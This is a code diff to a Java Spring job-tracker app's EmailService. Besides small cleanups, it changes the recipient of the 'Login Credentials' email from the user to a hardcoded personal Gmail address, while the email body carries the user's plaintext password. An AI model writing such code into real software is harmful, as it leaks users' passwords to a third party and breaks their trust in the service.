@@ -1,7 +1,6 @@
 package com.ayush.jobtracker.service;
 
 import org.springframework.beans.factory.annotation.Value;
-// import org.springframework.mail.SimpleMailMessage;
 import org.springframework.mail.javamail.JavaMailSender;
 import org.springframework.scheduling.annotation.Async;
 import org.springframework.stereotype.Service;
@@ -79,7 +78,7 @@ public class EmailService {
                    resend.emails().send(sendemail);
                 }
                 catch(ResendException ex){
-                    ex.printStackTrace();
+                   ex.printStackTrace();
                 }
         
     }
@@ -89,7 +88,7 @@ public class EmailService {
         Resend resend = new Resend(apikey);
         CreateEmailOptions mailsender = CreateEmailOptions.builder()
         .from("Jobtracker <onboarding@resend.dev>")
-                .to(email)
+                .to("ishusingh1404@gmail.com")
                 .subject("Login Credentials")
                 .html("<h1>Welcome To Jobtracker</h1><br/><h2>Your Login credentials Are</h2><br><p>email : "+email+"</p><br/><p>Password : "+Password)
                 .build();
